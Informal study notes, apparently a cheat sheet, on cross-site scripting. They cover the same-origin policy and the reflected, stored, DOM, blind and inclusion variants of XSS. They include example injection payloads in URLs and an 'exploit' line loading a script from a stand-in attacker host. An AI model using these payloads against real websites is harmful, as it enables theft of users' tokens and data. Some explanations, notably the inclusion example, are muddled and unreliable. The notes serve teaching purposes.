*XSS => Cross Site Scripting 


This attack occurs whenever we can load a JavaScript code in the DOM of the desired page.


- bypass SOP:

  
   https://target.tld/search?q=<XSS_Payload>


For example, the attacker in the above address has realized that he can launch an XSS attack by injecting the payload, and he knows that the target token is located in the /usr/token path, and he can get it with the right payload. 


for example :

Payload => script src="https://target.tld/usr/token.js"></script>
browser console => alert(token);


But if the attacker wants to send a request directly to that path, SOP stops the browser!


*XSS Types:


  - Reflected XSS(RXSS):

    
     https://target.tld/search?q=<script>alert(1);</script>


  - Stored XSS(SXSS):

    
     https://target.tld/user?email=<script>alert(1);</script>


  - DOM XSS(DXSS):

    
    https://target.tld/user#";alert(1);

    
    developer => location.hash


   - Blind XSS(BXSS):
   
    The code runs where Attacker doesn't see it


   
   - XSSi => XSS Inclusion

     
         - js => automate generate 
         - email , token , ...
             - exploit : 
                            <script src="http://atacker.tld/info.js"></script>
